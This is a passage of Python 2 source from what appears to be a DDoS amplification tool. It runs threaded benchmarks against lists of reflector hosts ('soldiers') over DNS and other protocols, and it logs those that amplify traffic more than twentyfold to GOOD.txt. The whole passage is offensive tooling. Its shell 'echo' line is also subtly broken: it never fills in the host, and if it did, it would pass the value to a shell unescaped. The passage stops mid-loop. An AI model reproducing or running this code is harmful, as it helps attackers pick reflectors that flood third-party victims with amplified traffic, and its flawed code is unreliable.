...
def AmpFactor(recvd, sent, soldier):
    amp = recvd / sent
    if amp > 20:
        os.system('echo "{}" >> GOOD.txt')
    return '{}x ({}B -> {}B)'.format(amp, sent, recvd)


def _benchMark(proto, ddos, soldier):
    if proto == 'dns':
        for domain in ddos.domains:
            recvd, sent = ddos.GetAmpSize(proto, soldier, domain)
            if recvd / sent:
                print '{:^8}|{:^15}|{:^23}|{}'.format(proto, soldier,
                                                      AmpFactor(recvd, sent, soldier), domain)
            else:
                continue
    else:
        recvd, sent = ddos.GetAmpSize(proto, soldier)
        print '{:^8}|{:^15}|{:^23}|{}'.format(proto, soldier,
                                              AmpFactor(recvd, sent, soldier), 'N/A')
...
def Benchmark(ddos):
    ...
    threadList = []
    for proto in files:
        _list = open(files[proto][FILE_NAME], 'r').read().splitlines()
        for soldier in _list:
            if soldier:
                t = threading.Thread(target=_benchMark, args=(proto, ddos, soldier))
                threadList.append(t)
                t.start()
                time.sleep(0.04)
            else:
